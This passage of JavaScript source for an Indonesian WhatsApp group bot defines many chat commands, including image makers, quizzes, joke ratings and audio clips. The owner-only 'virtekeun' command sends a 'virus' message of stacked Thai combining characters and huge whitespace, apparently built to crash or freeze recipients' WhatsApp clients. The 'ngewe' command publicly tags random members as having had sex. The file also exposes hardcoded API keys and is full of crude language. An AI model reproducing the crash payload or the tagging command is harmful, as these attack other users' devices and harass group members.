            buttonId: `${prefix}lambangcc`,
            buttonText: {
              displayText: `LAMBANG CC`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}🎺`,
            buttonText: {
              displayText: `🎺 JJ`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}🎺🎺`,
            buttonText: {
              displayText: `FAST JJ`,
            },
            type: 1,
          },
        ]);
        break
case "votemenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/3357c40ff7cdded3dbc7d.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*VOTE*
• ${prefix}voting
• ${prefix}delvote
 vote
 devote` })
					break
//Akhirrr
case "maker1":
                                  
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulis Sya`)
if (args.length < 1) return reply(`mau tulis apa um?`)
reply('Bentar')
burik = body.slice(8)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/maker3d?text=${burik}apikey=Alphabot`)
buffer = await getBuffer(anu.result)
syaa.sendMessage(from, buffer, image, { quoted: mek, caption: 'Nah dah selesai, tulisan gw gimana?bagus gak?'})
break
case "gogle":
                const googleQuery = body.slice(6)
               
                if(googleQuery == undefined || googleQuery == ' ') return reply(`*Hasil Pencarian : ${googleQuery}* tidak ditemukan`)
                google({ 'query': googleQuery }).then(results => {
                let vars = `_*Hasil Pencarian : ${googleQuery}*_\n`
                for (let i = 0; i < results.length; i++) {
                    vars +=  `\n═════════════════\n\n*Judul* : ${results[i].title}\n\n*Deskripsi* : ${results[i].snippet}\n\n*Link* : ${results[i].link}\n\n`
                }
                    reply(vars)
                }).catch(e => {
                    console.log(e)
                    syaa.sendMessage(from, 'Google Error : ' + e);
                })
                break 
case "tebakgambar":
					  
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
case "lesbicek":
					// ⚠️ Case by DappaUhuy&YogPw
                 
                 
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "gantengcek":
					// ⚠️ Case by DappaUhuy&YogPw

                 
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "cantikcek":
					// ⚠️ Case by DappaUhuy&YogPw

                 
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "watak":
					// ⚠️ Case by DappaUhuy&YogPw

                 
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
					await limitAdd(sender)
				        break
		         case "hobby":
					// ⚠️ Case by DappaUhuy&YogPw

                 
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
                case "jadian":
				
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
          case "ngewe":
				
			
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "terganteng":
				
				
					jds = []
					const jdiidc = groupMembers
					const kosstc = groupMembers
					const akuutc = jdiidc[Math.floor(Math.random() * jdiidc.length)]
					teks = `Yang terganteng di grub ini adalah @${akuutc.jid.split('@')[0]}`
					jds.push(akuutc.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "tercantik":
				
				
					jds = []
					const jdiidr = groupMembers
					const kosstr = groupMembers
					const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
					teks = `Yang tercantik di grub ini adalah @${akuutr.jid.split('@')[0]}`
					jds.push(akuutr.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
					case "googlem":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
memek3 = kontol.split("|")[0];
memek4 = kontol.split("|")[1];
memek5 = kontol.split("|")[2];
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker?text=${memek3}&text2=${memek4}&text3=${memek5}&theme=google-suggestion&apikey=beta`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "textburn":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}textburn arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(10)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=text-burn&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "quote":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}quote arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=art-quote&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "wooden":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}wooden arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=wooden-boarch&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "roses":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}roses arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=golden&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "neon":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
SyaGanz = body.slice(6)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/metallic?text=${SyaGanz}&theme=neon&apikey=beta`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case "naruto2":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix + command} Arasya Ganteng`)
				reply('Bentar lagi di proses')
indobgt = body.slice(7)
anu = await fetchJson(`https://api.zeks.me/api/naruto?apikey=apivinz&text=${indobgt}`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case "maker3d":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
kentod = body.slice(9)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/maker3d/no4?text=${kentod}&apikey=beta`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case 'cuaca1': // pikirin sendiri lah tot,cape gw ngerjain sc kontol sampe malem malem,kena marah ortu bangsat

                if (args.length < 1) return reply(`Masukan nama daerah`)
                reply(`[❕] Loading`)
                asu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/infocuaca?provinsi=${args[0]}&apikey=beta`)
                teks = '=================\n'
                lala = `${asu.result.result}`
                for (let i of lala) {
                teks += `• *Title*: ${i.title}\n• *Kota*: ${i.nama_kota}\n• *Cuaca Malam* : ${i.cuaca_malam}\n• *Cuaca dini hari* : ${i.cuaca_dini_hari}\n• *Suhu* : ${i.suhu}\n=================\n`
                }
                ikkeh_kimochi_ahhh = await getBuffer(`https://i.postimg.cc/hvHsThsH/images-17.jpg`)
                syaa.sendMessage(from, ikkeh_kimochi_ahhh, image, {quoted: mek, caption: teks})
                break
case "pubglogo":
       
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubglogo Arasya|Ganz`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/game?text=${memek1}&text2=${memek2}&theme=pubg&apikey=beta`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'mediafire': //By Arga
				reply(mess.wait)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/mediafiredl?url=${args[0]}/file&apikey=Ikyy69`, {method: 'get'})
buffer = await getBuffer(anu.download)
teks = `Nama File : ${anu.title}
Creator : ${anu.creator}
File Size : ${anu.fileSize}
Tanggal Upload : ${anu.uploadAt}
Link Download : ${anu.urlDown}`
syaa.sendMessage(from, teks, text, {quoted: mek})
costum(buffer, MessageType.document)
break
         case "s1":
       if (isBanned) return reply(mess.ban)
satu1 = fs.readFileSync('./30detik/s1.mp3');
syaa.sendMessage(from, satu1, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s2":
       if (isBanned) return reply(mess.ban)
satu2 = fs.readFileSync('./30detik/s2.mp3');
syaa.sendMessage(from, satu2, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s3":
       if (isBanned) return reply(mess.ban)
satu3 = fs.readFileSync('./30detik/s3.mp3');
syaa.sendMessage(from, satu3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s4":
       if (isBanned) return reply(mess.ban)
satu4 = fs.readFileSync('./30detik/s4.mp3');
syaa.sendMessage(from, satu4, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s5":
       if (isBanned) return reply(mess.ban)
satu5 = fs.readFileSync('./30detik/s5.mp3');
syaa.sendMessage(from, satu5, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s6":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s6.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s7":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s7.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s8":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s8.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s9":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s9.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s10":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s10.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s11":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s11.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s12":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s12.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s13":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s13.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s14":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s14.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s15":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s15.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s16":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s16.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s17":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s17.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s18":
       if (isBanned) return reply(mess.ban)
satu6 = fs.readFileSync('./30detik/s18.mp3');
syaa.sendMessage(from, satu6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case "s19":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s19.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s20":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s20.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s21":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s21.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s22":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s22.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s23":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s23.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s24":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s24.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s25":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s25.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s26":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s26.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s27":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s27.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s28":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s28.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s29":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s29.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "s31":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/s31.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "Assalamualaikum":
case "assalamualaikum":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/ass.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case "waifum":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix + command}Arasya|Ganz`)
				reply(mess.wait)
     ct = body.slice(8)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/bot/gfx4?apikey=hardianto&text1=${memek1}&text2=${memek2}`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case "ctahta":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ctahta Arasya|Ganteng|`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     memek3 = ct.split("|")[2];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/customtahta?query=${memek1}\n${memek2}\n${memek3}&apikey=hardianto`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'memegenerator':
    case 'memegen':                    
              top = arg.split('|')[0]
              bottom = arg.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await syaa.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("39d895963468b814fad0514bd28787e2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
/*case 'pornhub':
                
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=pemburuBansos&text1=${txt1}&text2=${txt2}`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
case "harta":
                
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://bx-hunter.herokuapp.com/api/chartatahta?text=${txt1}&apikey=Ikyy69`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
case 'tahta':
				if (isBanned) return reply(mess.ban)
				dapuhy = body.slice(7)
				reply("loading.....")
				asu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${dapuhy}&apikey=apivinz`)
				syaa.sendMessage(from, asu, image, {quoted: mek})
				break
case "hartatahta":
         if (args.length == 0) return reply(`Usage: ${prefix} + command} text\nExample: ${prefix + command} DHA`) 
         teks = args.join(" ") 
         reply('SABAR YA SAYANG....') 
         buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=pemburuBansos&text=${teks}`) 
         syaa.sendMessage(from, buffer, image, {quoted: mek, caption : 'ini hasilnya kak....'})
         break   
case "pppppp":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}glitch Arasya|Ganz`)
				reply('Sebentar lagi di buat')
     ct = body.slice(8)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/photooxy/glitch?text1=${memek1}&text2=${memek2}&apikey=Ikyy69`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case "caklontong":
  if (isBanned) return reply(mess.ban)
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
      //------------------< Fitur Anti antian >-------------------
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
        
case 'asupan':
  if (isBanned) return reply(mess.ban)
  if (!isPremium) return reply(mess.prem)
  
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break 			
case 'asupan2':
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break
        
case 'buggc':
if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
await syaa.toggleDisappearingMessages(from)
text = 'Mampus!!'
syaa.sendMessages(from, text, text, {quoted: mek})
break
///𝑃𝐼𝑅𝑇𝐸𝐾
 case "virtekeun":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
   reply(`🇮🇮🇩⃢⃞⃝     🇮🇩⃢⃞⃝۝̶ *VIRUS 🇮🇩⃢⃞⃝۝̶ EROR SYSTEM۝⃢⃞̶*۝⃢⃞̶🇮🇩
🇮🇩⃢⃞⃝۝̶ *EROR SYSTEM*۝⃢⃞̶🇮🇩
🇮🇩⃢⃞⃝۝̶ *EROR System'*۝⃢⃞̶🇮🇩
*9999999* *ผิดุท้่                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
